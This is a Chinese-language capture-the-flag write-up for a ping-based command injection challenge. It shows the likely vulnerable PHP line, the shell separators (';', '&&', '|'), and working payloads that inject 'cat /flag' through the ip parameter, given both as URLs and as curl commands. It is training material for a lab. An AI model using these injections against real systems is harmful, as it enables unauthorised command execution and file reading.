# 21-cmdi-ping-concat

## 题目信息

- 类型：命令执行 / 命令拼接注入
- Flag 格式：`TOGOGO-flag{}`

## 解题思路

打开页面后可以看到这是一个网络诊断 Ping 功能：

```html
<form method="get">
  <input type="text" name="ip" placeholder="目标 IP 或域名" />
</form>
```

页面还提示：

```text
Flag 文件位置：/flag
```

这种题一般后端类似这样写：

```php
system("ping -c 1 " . $_GET["ip"]);
```

如果 `ip` 参数没有过滤，就可以用 shell 连接符拼接第二条命令。

常见连接符：

```text
;   前一条命令执行完后继续执行后一条
&&  前一条命令成功后执行后一条
|   管道
```

本题使用 `;cat /flag` 即可。

## 手工复刻

### 1. 先正常访问

浏览器打开：

```text
http://目标地址/?ip=127.0.0.1
```

可以看到正常的 ping 输出。

### 2. 拼接读取 flag

浏览器访问下面的 URL：

```text
http://目标地址/?ip=127.0.0.1%3Bcat%20/flag
```

其中 URL 解码后是：

```text
ip=127.0.0.1;cat /flag
```

返回结果中会出现：

```text
TOGOGO-flag{}
```

也可以用 `&&`：

```text
http://目标地址/?ip=127.0.0.1%26%26cat%20/flag
```

## curl 复现

```bash
curl 'http://目标地址/?ip=127.0.0.1%3Bcat%20/flag'
```

如果只想提取 flag：

```bash
curl -s 'http://目标地址/?ip=127.0.0.1%3Bcat%20/flag' | grep -o 'TOGOGO-flag{[^}]*}'
```
